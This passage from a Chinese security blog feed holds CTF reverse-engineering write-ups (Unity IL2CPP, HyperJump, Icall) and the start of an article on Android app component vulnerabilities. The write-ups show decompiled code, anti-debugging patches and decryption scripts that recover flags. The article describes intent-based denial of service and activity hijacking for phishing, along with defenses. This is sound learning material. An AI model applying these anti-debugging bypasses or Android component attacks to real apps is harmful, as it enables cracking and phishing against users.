System_Array_o *array; // x0  System_RuntimeFieldHandle_o fldHandle; // x1  System_Array_o *Key; // x19  struct FlagChecker_StaticFields *static_fields; // x0  System_Array_o *array_1; // x0  System_RuntimeFieldHandle_o fldHandle_1; // x1  System_Array_o *ReallyCompare; // x19  struct FlagChecker_StaticFields *static_fields_1; // x0  if ( (byte_9D8040 + 7) / byte_9D8044 != byte_9D8048 )  &#123;    LOBYTE(v1) = byte_9D804C;    LOBYTE(v2) = byte_9D8050;    if ( byte_9D8050 + 30 * byte_A2F928 == 3 )    &#123;      if ( (byte_9D8040 + 7) / byte_9D8044 == byte_9D8048 )        n9 = 0;      else        n9 = ((v1 - (v2 + v2)) * ((byte_A2F8C2 &amp; 1) == 0) * ((byte_9D8040 + 7) / byte_9D8044 - byte_9D8048));    &#125;    else    &#123;      n9 = 9;    &#125;    if ( ((byte_9D8040 + 7) / byte_9D8044 - byte_9D8048) * n9 )    &#123;      sub_2744F4(&amp;byte___TypeInfo);      sub_2744F4(&amp;FlagChecker_TypeInfo);      sub_2744F4(&amp;Field__PrivateImplementationDetails__29FC2CC7503351583297C73AC477A5D7AA78899F3C0D66E1F909139D4AA1FFB2);      sub_2744F4(&amp;Field__PrivateImplementationDetails__C8E4E9E3F34C25560172B0D40B6DF4823260AA87EC6866054AA4691711E5D7BF);      sub_2744F4(&amp;uint___TypeInfo);      byte_A2F8C2 = 1;    &#125;  &#125;  array = sub_274508(uint___TypeInfo, 4LL);  fldHandle.fields.value = Field__PrivateImplementationDetails__C8E4E9E3F34C25560172B0D40B6DF4823260AA87EC6866054AA4691711E5D7BF;  Key = array;  System_Runtime_CompilerServices_RuntimeHelpers__InitializeArray_4166724(array, fldHandle, 0LL);  static_fields = FlagChecker_TypeInfo-&gt;static_fields;  static_fields-&gt;Key = Key;  sub_274498(static_fields, Key);  array_1 = sub_274508(byte___TypeInfo, 40LL);  fldHandle_1.fields.value = Field__PrivateImplementationDetails__29FC2CC7503351583297C73AC477A5D7AA78899F3C0D66E1F909139D4AA1FFB2;  ReallyCompare = array_1;  System_Runtime_CompilerServices_RuntimeHelpers__InitializeArray_4166724(array_1, fldHandle_1, 0LL);  static_fields_1 = FlagChecker_TypeInfo-&gt;static_fields;  static_fields_1-&gt;ReallyCompare = ReallyCompare;  sub_274498(&amp;static_fields_1-&gt;ReallyCompare, ReallyCompare);&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028114501728.png" alt="image-20251028114501728"></p><p>​可以根据这个值去 dump.cs 中找到密文和key偏移</p><pre><code class="language-cs">// Namespace: internal sealed class &lt;PrivateImplementationDetails&gt; // TypeDefIndex: 2223&#123;// Fieldsinternal static readonly &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=40 29FC2CC7503351583297C73AC477A5D7AA78899F3C0D66E1F909139D4AA1FFB2 /*Metadata offset 0xF901D*/; // 0x0internal static readonly &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=16 C8E4E9E3F34C25560172B0D40B6DF4823260AA87EC6866054AA4691711E5D7BF /*Metadata offset 0xF9045*/; // 0x28&#125;</code></pre><p>​010editor 打开去找</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028115428102.png" alt="image-20251028115428102"></p><p>写脚本解密</p><pre><code class="language-python">import structdef perform_decryption_cycle(block_pair, key_schedule):    val0 = block_pair[0]    val1 = block_pair[1]    constant_delta = 0x61C88647    current_sum = (-16 * constant_delta) &amp; 0xFFFFFFFF    k0, k1, k2, k3 = key_schedule    for _ in range(16):        current_sum = (current_sum + constant_delta) &amp; 0xFFFFFFFF        term_shift_left_v0 = (val0 &lt;&lt; 4) &amp; 0xFFFFFFFF        term_shift_right_v0 = (val0 &gt;&gt; 5) &amp; 0xFFFFFFFF        xor_operand_v1 = (term_shift_left_v0 + k2) ^ (val0 + current_sum) ^ (term_shift_right_v0 + k3)        val1 = (val1 - xor_operand_v1) &amp; 0xFFFFFFFF        term_shift_left_v1 = (val1 &lt;&lt; 4) &amp; 0xFFFFFFFF        term_shift_right_v1 = (val1 &gt;&gt; 5) &amp; 0xFFFFFFFF        xor_operand_v0 = (term_shift_left_v1 + k0) ^ (val1 + current_sum) ^ (term_shift_right_v1 + k1)        val0 = (val0 - xor_operand_v0) &amp; 0xFFFFFFFF    block_pair[0] = val0    block_pair[1] = val1    return block_paircipher_bytes_data = bytes([    0xaf, 0x58, 0x64, 0x40, 0x9d, 0xb9, 0x21, 0x67,    0xae, 0xb5, 0x29, 0x04, 0x9e, 0x86, 0xc5, 0x43,    0x23, 0x0f, 0xbf, 0xa6, 0xb2, 0xae, 0x4a, 0xb5,    0xc5, 0x69, 0xb7, 0xa8, 0x03, 0xd1, 0xae, 0xcf,    0xc6, 0x2c, 0x5b, 0x7f, 0xa2, 0x86, 0x1e, 0x1a,])encryption_key = [0x12345678, 0x09101112, 0x13141516, 0x15161718]mutable_cipher_bytes = list(cipher_bytes_data)for byte_offset_l in range(32, 0, -8):    # 1️⃣ XOR 前 8 个字节    for i in range(8):        mutable_cipher_bytes[byte_offset_l + i] ^= mutable_cipher_bytes[i]    # 2️⃣ 对前 8 字节执行解密    segment_bytes_to_decrypt = bytes(mutable_cipher_bytes[0:8])    block_data_pair = list(struct.unpack(&quot;&lt;2I&quot;, segment_bytes_to_decrypt))    perform_decryption_cycle(block_data_pair, encryption_key)    updated_segment_bytes = struct.pack(&quot;&lt;2I&quot;, *block_data_pair)    # 更新前 8 个字节    for i in range(8):        mutable_cipher_bytes[i] = updated_segment_bytes[i]# 最后再解一次（有些算法会双解或多轮）segment_bytes_to_decrypt = bytes(mutable_cipher_bytes[0:8])block_data_pair = list(struct.unpack(&quot;&lt;2I&quot;, segment_bytes_to_decrypt))perform_decryption_cycle(block_data_pair, encryption_key)updated_segment_bytes = struct.pack(&quot;&lt;2I&quot;, *block_data_pair)for i in range(8):    mutable_cipher_bytes[i] = updated_segment_bytes[i]final_decrypted_bytes = bytes(mutable_cipher_bytes)print(final_decrypted_bytes.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;))</code></pre><p>flag{unitygame_I5S0ooFunny_Isnotit?????}</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="HyperJump"><a href="#HyperJump" class="headerlink" title="HyperJump"></a>HyperJump</h3><p>IDA 打开分析，刚开始想尝试去弄明白逻辑，但是发现太复杂了，想手搓复现根本不可能，AI吧，又没钱充 ChatGPT5，然后开始上手动调看看逻辑，刚开始动调的时候发现刚挂上就闪退了，发现忘记把两处反调试nop了，直接 nop 掉即可，就可以正常动态调试了(标红出来的这两处就是anti_debug的地方)</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251025182355320.png" alt="image-20251025182355320"></p><p>然后开始动调，首先是检测flag长度为24，而去掉flag{}这六位，就剩18位，并且check的时候也会check flag{}，这样带来的好处就是有利于动调爆破，后来在看汇编的时候发现有个cmp，对每个字符进行加密check之后都会进行比对，只要有一个错误就直接退出</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/f52da144a7bf6ea7088ba4df13bd072b.png" alt="f52da144a7bf6ea7088ba4df13bd072b"></p><p>按道理来说应该可以把算法复现出来，然后写脚本爆破，但是奈何脚本搓不出来，就只能手动爆破了，回到最原始的方式（真是无敌了）。</p><p>就这样，试了几个小时，试出来了，然后题目hint中提到flag的md5值，说明可能是多解，但好在试出来的这个刚好就对上了。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251025182846804.png" alt="image-20251025182846804"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251025182908186.png" alt="image-20251025182908186"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251025182932408.png" alt="image-20251025182932408"></p><p>flag{m4z3d_vm_jump5__42}</p><h3 id="Icall"><a href="#Icall" class="headerlink" title="Icall"></a>Icall</h3><p>先静态分析了一下，首先看的是init，发现有反调试<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251026074710526.png" alt="image-20251026074710526"></p><p>然后直接该if的判断，从jz改成jnz就可以直接跳过，不进入到if语句内部执行逻辑即可</p><p>然后看main函数的话，发现混淆很严重，但是从函数列表中可以发现函数的数量并不多，于是就挨个去看了下，发现了三个可疑函数</p><p>第一个是很像凯撒加密的函数（后面就称其为凯撒加密函数）</p><pre><code class="language-c">__int64 __fastcall kaisa(char a1)&#123;  int n1668413646; // edx  int n1321055944; // edi  int n1668413646_3; // edi  int n1668413646_2; // esi  int n1668413646_1; // [rsp+10h] [rbp-30h]  int v7; // [rsp+14h] [rbp-2Ch]  char v9; // [rsp+2Fh] [rbp-11h]  int v10; // [rsp+3Ch] [rbp-4h]  v10 = *(*((*(qword_406198 + 1518159036) - 66708104LL))() + 2LL * a1) &amp; 0x100;  n1668413646_1 = -1576811487;  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( n1668413646_1 &lt; -630065159 )      &#123;        if ( n1668413646_1 &lt; -1013558147 )        &#123;          if ( n1668413646_1 &lt; -1266885767 )          &#123;            n1668413646 = 1668413646;            if ( v10 )              n1668413646 = -1013558147;            n1668413646_1 = n1668413646;          &#125;          else if ( n1668413646_1 &lt; -1152562549 )          &#123;            v7 = (7 * (a1 - &#39;0&#39;) + 11) % 10;            n1668413646_2 = -1152562549;            if ( v7 &lt; 0 )              n1668413646_2 = -764946794;            n1668413646_1 = n1668413646_2;          &#125;          else          &#123;            v9 = v7 + 48;            n1668413646_1 = 1433409905;          &#125;        &#125;        else if ( n1668413646_1 &lt; -788615130 )        &#123;          v9 = (7 * (a1 - &#39;A&#39;) + 11) % 26 + 65;          n1668413646_1 = 1433409905;        &#125;        else if ( n1668413646_1 &lt; -764946794 )        &#123;          v9 = (7 * (a1 - &#39;a&#39;) + 11) % 26 + 97;          n1668413646_1 = 1433409905;        &#125;        else        &#123;          LOBYTE(v7) = v7 + 10;          n1668413646_1 = -1152562549;        &#125;      &#125;      if ( n1668413646_1 &gt;= 1433409905 )        break;      if ( n1668413646_1 &lt; -624870238 )      &#123;        v9 = a1;        n1668413646_1 = 1433409905;      &#125;      else if ( n1668413646_1 &gt;= 1321055944 )      &#123;        n1668413646_3 = -624870238;        if ( (*(*((*(qword_406198 + 1518159036) - 66708104LL))() + 2LL * a1) &amp; 0x800) != 0 )          n1668413646_3 = -1266885767;        n1668413646_1 = n1668413646_3;      &#125;      else      &#123;        n1668413646_1 = 2084301942;      &#125;    &#125;    if ( n1668413646_1 &lt; 1668413646 )      break;    if ( n1668413646_1 &lt; 2084301942 )    &#123;      n1321055944 = 1321055944;      if ( (*(*((*(qword_406198 + 1518159036) - 66708104LL))() + 2LL * a1) &amp; 0x200) != 0 )        n1321055944 = -788615130;      n1668413646_1 = n1321055944;    &#125;    else    &#123;      n1668413646_1 = -630065159;    &#125;  &#125;  return v9;&#125;</code></pre><p>后面两个就分别是rc4的初始化函数和加密函数了</p><pre><code class="language-c">__int64 __fastcall rc4_init(__int64 a1, __int64 a2, int a3)&#123;  __int64 n2031415971_1; // rax  int n2031415971_2; // edx  int n2031415971_3; // edx  int n2031415971; // [rsp+1Ch] [rbp-134h]  char s[256]; // [rsp+20h] [rbp-130h] BYREF  int v8; // [rsp+120h] [rbp-30h]  int v9; // [rsp+124h] [rbp-2Ch]  int n256; // [rsp+128h] [rbp-28h]  int v11; // [rsp+12Ch] [rbp-24h]  __int64 key; // [rsp+130h] [rbp-20h]  __int64 v13; // [rsp+138h] [rbp-18h]  int n953312896; // [rsp+148h] [rbp-8h]  int n953312896_1; // [rsp+14Ch] [rbp-4h]  n953312896 = 953312896;  n953312896_1 = 953312896;  v13 = a1;  key = a2;  v11 = a3;  memset(s, 0, sizeof(s));  n256 = 0;LABEL_25:  n2031415971_2 = n953312896_1 + 1078103075;  if ( n256 &lt; 256 )    n2031415971_2 = n953312896_1 + 1421397418;  n2031415971 = n2031415971_2;  do  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( n2031415971 &lt; -776628777 )        &#123;          if ( n2031415971 &lt; -1126335090 )          &#123;            if ( n2031415971 &lt; -1342440884 )            &#123;              if ( n2031415971 == -1920256982 )              &#123;                *(v13 + n256) = n256;                s[n256] = *(key + n256 % v11);                n2031415971 = n953312896_1 - 1738164735;              &#125;            &#125;            else if ( n2031415971 == -1342440884 )            &#123;              v8 = (s[n256] + *(v13 + n256) + v8) % 256;              v9 = (s[n256] + *(v13 + v8) + v8) % 256;              ((*(qword_406180 + 2067789068) - 675034692LL))(v9 + v13, v8 + v13);              n2031415971 = n953312896_1 - 1729941673;            &#125;          &#125;          else if ( n2031415971 &lt; -784851839 )          &#123;            if ( n2031415971 == -1126335090 )              goto LABEL_25;          &#125;          else if ( n2031415971 == -784851839 )          &#123;            ++n256;            n2031415971 = n953312896_1 - 2079647986;          &#125;        &#125;        if ( n2031415971 &gt;= -628551728 )          break;        if ( n2031415971 &lt; -741556009 )        &#123;          if ( n2031415971 == -776628777 )          &#123;            ++n256;            n2031415971 = n953312896_1 - 1694868905;          &#125;        &#125;        else if ( n2031415971 == -741556009 )        &#123;          n2031415971_3 = n953312896_1 - 1581864624;          if ( n256 &lt; 256 )            n2031415971_3 = n953312896_1 + 1999213516;          n2031415971 = n2031415971_3;        &#125;      &#125;      if ( n2031415971 &lt; 2031415971 )        break;      if ( n2031415971 == 2031415971 )      &#123;        v8 = 0;        v9 = 0;        n256 = 0;        n2031415971 = n953312896_1 - 1694868905;      &#125;    &#125;    n2031415971_1 = n2031415971;  &#125;  while ( n2031415971 != -628551728 );  return n2031415971_1;&#125;</code></pre><p>加密函数</p><pre><code class="language-c">__int64 __fastcall rc4(char *a1, __int64 a2, int a3, int a4)&#123;  int n16635716; // esi  int n841780568_1; // esi  int n841780568; // [rsp+1Ch] [rbp-44h]  int v8; // [rsp+20h] [rbp-40h]  char v9; // [rsp+26h] [rbp-3Ah]  char v10; // [rsp+27h] [rbp-39h]  int index; // [rsp+28h] [rbp-38h]  int v12; // [rsp+30h] [rbp-30h]  int v13; // [rsp+34h] [rbp-2Ch]  v9 = *a1;  v12 = 0;  v13 = 0;  index = 0;  for ( n841780568 = -1352487153; ; n841780568 = 841780568 )  &#123;    while ( 1 )    &#123;      while ( n841780568 &lt; -86367832 )      &#123;        if ( n841780568 &lt; -498778613 )        &#123;          if ( n841780568 &lt; -547120796 )          &#123;            n16635716 = -86367832;            if ( index &lt; a3 )              n16635716 = 16635716;            n841780568 = n16635716;          &#125;          else          &#123;            *(a2 + index) ^= v9 ^ v10;            v9 = *(a2 + index);            n841780568 = 1776665005;          &#125;        &#125;        else if ( n841780568 &lt; -134357446 )        &#123;          v13 = (v13 + 1) % 256;          v12 = (a1[v13] + v12) % 256;          ((*(qword_406188 + 2048138584) + 1461912248LL))(&amp;a1[v13], &amp;a1[v12]);          v10 = a1[(a1[v12] + a1[v13]) % 256];          n841780568 = -134357446;        &#125;        else        &#123;          ++v8;          n841780568 = 841780568;        &#125;      &#125;      if ( n841780568 &lt; 841780568 )        break;      if ( n841780568 &lt; 1776665005 )      &#123;        n841780568_1 = -547120796;        if ( v8 &lt; a4 )          n841780568_1 = -498778613;        n841780568 = n841780568_1;      &#125;      else      &#123;        ++index;        n841780568 = -1352487153;      &#125;    &#125;    if ( n841780568 &lt; 16635716 )      break;    v8 = 0;  &#125;  return n841780568;&#125;</code></pre><p>接下来就开始动态调试。断点分别先打在上面的这三个函数，以下如下的一个地址，在这里会进行输入<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251026075702200.png" alt="image-20251026075702200"></p><p>然后直接F4就会到凯撒加密函数，按30次F4，就会跳转到rc4的初始化函数。通过不断调试尝试，可以发现会经过三次RC4，key的话是<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251026075908312.png" alt="image-20251026075908312"></p><p>然后按F4，跳转到RC4加密函数，虽然有key，但是这是RC4，直接去抓和明文异或的值更方便更省事，于是把断点下在异或的地方，每次异或都跟进去抓这个值</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251026080125456.png" alt="image-20251026080125456"></p><p>跟进查看v10</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251026080147170.png" alt="image-20251026080147170"></p><p>继续</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251026080218105.png" alt="image-20251026080218105"></p><p>重复上述操作，拿到三次异或的值，但是这里还有一个点就是每次明文异或之后，还有一个流异或，后一个异或前一个值，然后第一个也进行了异或，每次都是异或一个固定值0xCD</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251026080850377.png" alt="image-20251026080850377"></p><p>然后继续调试，最后可以追到密文<br>main函数<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028101104699.png" alt="image-20251028101104699"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028101119643.png" alt="image-20251028101119643"></p><p>然后编写脚本</p><pre><code class="language-python">def decrypt_layer1():    print(&quot;=== 第一层解密：多层异或解密 ===&quot;)    # 加密后的结果    encrypted = [        0xF7, 0x88, 0xC3, 0x29, 0x36, 0x64, 0x63, 0x29,        0xC7, 0x7F, 0x1C, 0xAB, 0x71, 0xE0, 0x03, 0x49,        0x73, 0xCB, 0x0A, 0xAF, 0x0C, 0x87, 0x84, 0x8E,        0x5A, 0x64, 0xC7, 0xAC, 0x2A, 0x67    ]    xor1 = [        0x5b, 0x55, 0x44, 0xc6, 0x74, 0x03, 0x6f, 0xa3, 0xb2, 0x00,        0x30, 0xe5, 0x71, 0x7e, 0x25, 0x32, 0x5a, 0x46, 0x31, 0xed,        0x6a, 0x1f, 0xd2, 0xd5, 0x04, 0x4a, 0xb2, 0x74, 0xdf, 0xad    ]    xor2 = [        0x97, 0x74, 0x20, 0x00, 0xeb, 0x25, 0x3e, 0xed, 0x10, 0x04,        0x84, 0xad, 0xba, 0xf5, 0x7f, 0xbf, 0x96, 0x94, 0x1a, 0x84,        0x92, 0x07, 0xce, 0x46, 0x09, 0xd9, 0x36, 0xe8, 0x29, 0x36    ]    xor3 = [        0x83, 0x6f, 0x8e, 0x7e, 0x3e, 0x6a, 0x63, 0x74, 0x9c, 0xf5,        0xfe, 0x77, 0x5b, 0x59, 0x92, 0x3c, 0x4d, 0xff, 0x31, 0xe8,        0x41, 0x02, 0x83, 0xa4, 0x27, 0x72, 0x60, 0xbd, 0x7a, 0x54    ]    qwq = [0] * 30    # 复制加密结果    for i in range(30):        qwq[i] = encrypted[i]    # 第4层解密：逆向 CBC -&gt; 逆向 0xCD -&gt; 逆向 xor3    for i in range(29, 0, -1):        qwq[i] = qwq[i] ^ qwq[i-1]    qwq[0] ^= 0xcd    for i in range(30):        qwq[i] = qwq[i] ^ xor3[i]    # 第3层解密：逆向 CBC -&gt; 逆向 0xCD -&gt; 逆向 xor2    for i in range(29, 0, -1):        qwq[i] = qwq[i] ^ qwq[i-1]    qwq[0] ^= 0xcd    for i in range(30):        qwq[i] = qwq[i] ^ xor2[i]    # 第2层解密：逆向 CBC -&gt; 逆向 0xCD -&gt; 逆向 xor1    for i in range(29, 0, -1):        qwq[i] = qwq[i] ^ qwq[i-1]    qwq[0] ^= 0xcd    for i in range(30):        qwq[i] = qwq[i] ^ xor1[i]    # 输出结果    print(&quot;解密后的mio: &quot;, end=&quot;&quot;)    for i in range(30):        print(chr(qwq[i]), end=&quot;&quot;)    print()    print(&quot;十六进制: &quot;, end=&quot;&quot;)    for i in range(30):        print(f&quot;&#123;qwq[i]:02x&#125; &quot;, end=&quot;&quot;)    print(&quot;\n&quot;)def affine_decrypt(c):    &quot;&quot;&quot;仿射密码解密函数&quot;&quot;&quot;    if c.isupper():        # 大写字母解密: D(x) = 15*(x - 11) mod 26        x = ord(c) - ord(&#39;A&#39;)        decrypted = (15 * (x - 11 + 26)) % 26        if decrypted &lt; 0:            decrypted += 26        return chr(ord(&#39;A&#39;) + decrypted)    elif c.islower():        # 小写字母解密: D(x) = 15*(x - 11) mod 26        x = ord(c) - ord(&#39;a&#39;)        decrypted = (15 * (x - 11 + 26)) % 26        if decrypted &lt; 0:            decrypted += 26        return chr(ord(&#39;a&#39;) + decrypted)    elif c.isdigit():        # 数字解密: D(x) = 3*(x - 11) mod 10        x = ord(c) - ord(&#39;0&#39;)        decrypted = (3 * (x - 11 + 10)) % 10        if decrypted &lt; 0:            decrypted += 10        return chr(ord(&#39;0&#39;) + decrypted)    else:        # 其他字符不变        return cdef decrypt_layer2():    print(&quot;=== 第二层解密：仿射密码解密 ===&quot;)    encrypted = &quot;uklb&#123;a1vYg_Az9_Luu8ynNyz8xm0!&#125;&quot;    decrypted = &quot;&quot;    print(f&quot;加密文本: &#123;encrypted&#125;&quot;)    # 解密每个字符    for char in encrypted:        decrypted += affine_decrypt(char)    print(f&quot;解密结果: &#123;decrypted&#125;\n&quot;)def affine_encrypt(c):    &quot;&quot;&quot;仿射密码加密函数（用于验证）&quot;&quot;&quot;    if c.isupper():        # 大写字母加密: E(x) = (7*x + 11) mod 26        x = ord(c) - ord(&#39;A&#39;)        encrypted = (7 * x + 11) % 26        return chr(ord(&#39;A&#39;) + encrypted)    elif c.islower():        # 小写字母加密: E(x) = (7*x + 11) mod 26        x = ord(c) - ord(&#39;a&#39;)        encrypted = (7 * x + 11) % 26        return chr(ord(&#39;a&#39;) + encrypted)    elif c.isdigit():        # 数字加密: E(x) = (7*x + 11) mod 10        x = ord(c) - ord(&#39;0&#39;)        encrypted = (7 * x + 11) % 10        if encrypted &lt; 0:            encrypted += 10        return chr(ord(&#39;0&#39;) + encrypted)    else:        return cdef main():    # 执行第一层解密（多层异或）    decrypt_layer1()    # 执行第二层解密（仿射密码）    decrypt_layer2()if __name__ == &quot;__main__&quot;:    main()</code></pre><p>flag{r0uNd_Rc4_Aff1neEnc1yp7!}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Android </tag>
            
            <tag> il2Cpps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android APP 常见漏洞</title>
      <link href="/2025/10/22/Android%20APP%20%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/10/22/Android%20APP%20%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-APP-常见漏洞"><a href="#Android-APP-常见漏洞" class="headerlink" title="Android APP 常见漏洞"></a>Android APP 常见漏洞</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​之前在学习 Android 逆向时更多地关注的是如何 Hook &amp; 动、静态分析，忽略了关于 <strong>四大组件</strong> 这方面的常见漏洞，故写下此篇文章。</p><h3 id="二、概述"><a href="#二、概述" class="headerlink" title="二、概述"></a>二、概述</h3><p><strong>Android 漏洞可能存在的点：</strong></p><ol><li>协议——通信协议（本地、网络），协议大部分是由C&#x2F;C++实现，存在以下安全问题：通信数据引发的逻辑漏洞；通信数据引发的 <code>缓冲区溢出</code> 等可能导致远程代码执行&#x2F;拒绝服务的代码漏洞。</li><li>组件安全——Activity，Service 服务，Content Provider 内容提供者，BroadcastReceiver 广播接收器中可能存在的安全问题，其中最主要的就是 intent 组件通信导致的拒绝服务&#x2F;越权漏洞。</li><li>开放端口——可通过命令查看各APP运行时存在的开放端口，然后去逆向分析APP查看其在此开放端口上进行的操作，从而找寻可能的漏洞。</li><li>IPC（进程间通信）安全——同1。</li><li>文件读写安全&#x2F;数据加密安全——Android平台上的隐私泄露也是一个值得关注的攻击面。</li></ol><h3 id="三、Android-APP-常见安全漏洞"><a href="#三、Android-APP-常见安全漏洞" class="headerlink" title="三、Android APP 常见安全漏洞"></a>三、Android APP 常见安全漏洞</h3><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/12.png" alt="img"></p><h4 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h4><p>​<strong>四大组件的安全问题很大一部分是由于组件设置成导出状态（android:exported&#x3D;true）引起的。</strong></p><p>​Android 四大组件中，Activity，Service，BroadcastReceiver 广播接收器之间都可以通过 <code>Intent</code> 行通信，所以他们都存在由 Intent 传输数据引发的本地拒绝服务漏洞。</p><ol><li><strong>背景知识</strong>：Android系统中的Intent机制负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，系统则根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。</li><li><strong>产生原理</strong>：Android应用本地拒绝服务漏洞源于程序处理<code>Intent.getXXXExtra()</code> 获取的数据时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用崩溃的目的。</li><li><strong>危害</strong>：<ul><li>导致安全防护等应用的防护功能被绕过或失效（如杀毒应用、安全卫士、防盗锁屏等）。</li><li>被竞争方应用利用并攻击，使得己方应用崩溃，造成不同程度的经济利益损失。</li></ul></li><li><strong>防护</strong>：<ul><li>将不必要的组件设置为不导出，在 <code>AndroidMenifest.xml</code> 文件中，将相应组件的 <code>android:exported</code> 属性设置为 <code>false</code>，防止引起拒绝服务，尤其是杀毒、安全防护、锁屏防盗等安全应用。</li><li>处理通过 <code>Intent.getXXXExtra()</code> 获取的数据时进行以下判断，同时用try-catch方式捕获所有异常，以防止应用出现拒绝服务漏洞：空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其他异常。</li></ul></li><li><strong>攻击代码示例</strong>：包括NullPointerException异常、ClassCastException异常、IndexOutOfBoundsException异常、ClassNotFoundException异常。</li></ol><h4 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h4><p> 组件导出导致钓鱼欺诈</p><p><strong>原理</strong>：</p><p>​Android 为了提高用户的用户体验，对于不同的应用程序之间的切换，基本上是无缝。他们切换的只是一个 Activity，让切换的到前台显示，另一个应用则被覆盖到后台，不可见。Activity 的概念相当于一个与用户交互的界面。而 Activity 的调度是交由 Android 系统中的 <strong>AMS</strong> 管理的。AMS 即 <strong>ActivityManagerService(Activity管理服务)</strong>，各个应用想启动或停止一个进程，都是先报告给 AMS。当 AMS 收到要启动或停止Activity 的消息时，它先更新内部记录，在通知相应的进程运行或停止指定的 Activity。当新的 Activity 启动，前一个 Activity 就会停止，这些Activity 都保留在系统中年的 Activity 历史栈中。每有一个 Activity 启动，它就压入历史栈顶，并在手机上显示。当用户按下 back 键时，顶部Activity 弹出，恢复前一个 Activity，栈顶指向当前的 Activity。由于Activity 的这种特性，如果在启动一个 Activity 时，给它加入一个标志位<strong>FLAGACTIVITYNEW_TASK</strong>，就能使它置于栈顶并立马呈现给用户。如果这个 Activity 是用于盗号的伪装 Activity，那么就会产生钓鱼安全事件或者是一个 Activity 中有 webview 加载，如果允许加载任意网页也有可能会产生钓鱼事件。</p><p><strong>防护：</strong></p><p>​如果当前的程序进入后台，则需要提示用户当前进程状态。</p><p><strong>隐式启动 intent 包含敏感数据</strong>：</p><p>Intent 类型：</p><ul><li><strong>显式 Intent</strong>：按名称（完全限定类名）指定要启动的组件。 通常，您会在自己的应用中使用显式 Intent 来启动组件，这是因为您知道要启动的 Activity 或服务的类名。例如，启动新 Activity 以响应用户操作，或者启动服务以在后台下载文件。</li></ul><blockquote><p>创建显式 Intent 启动 Activity 或服务时，系统将立即启动 Intent 对象中指定的应用组件。</p></blockquote><ul><li><strong>隐式 Intent</strong> ：不会指定特定的组件，而是声明要执行的常规操作，从而允许其他应用中的组件来处理它。 例如，如需在地图上向用户显示位置，则可以使用隐式 Intent，请求另一具有此功能的应用在地图上显示指定的位置。</li></ul><blockquote><p>创建隐式 Intent 时，Android 系统通过将 Intent 的内容与在设备上其他应用的清单文件中声明的 Intent 过滤器进行比较，从而找到要启动的相应组件。 如果 Intent 与 Intent 过滤器匹配，则系统将启动该组件，并向其传递 Intent 对象。 如果多个 Intent 过滤器兼容，则系统会显示一个对话框，支持用户选取要使用的应用。</p></blockquote><p>​对于显式 Intent，Android 不需要去做解析，因为目标组件已经很明确，Android 需要解析的是那些隐式 Intent，通过解析，将 Intent 映射给可以处理此 Intent 的 Activity、IntentReceiver 或 Service。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/5.png" alt="img"></p><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><p><strong>概述</strong></p><p>​Service (服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。 例如，服务可以处理网络事务、播放音乐，执行文件 I&#x2F;O 或与内容提供程序交互，而所有这一切均可在后台进行，Service基本上分为两种形式：</p><pre><code>1. **启动状态**</code></pre><p>​当应用组件（如 Activity）通过调用 startService() 启动服务时，服务即处于“启动”状态。一旦启动，服务即可在后台无限期运行，即使启动服务的组件已被销毁也不受影响，除非手动调用才能停止服务， 已启动的服务通常是执行单一操作，而且不会将结果返回给调用方。</p><pre><code>2. **绑定状态**</code></pre><p>​当应用组件通过调用 bindService() 绑定到服务时，服务即处于“绑定”状态。绑定服务提供了一个客户端-服务器接口，允许组件与服务进行交互、发送请求、获取结果，甚至是利用进程间通信 (IPC) 跨进程执行这些操作。 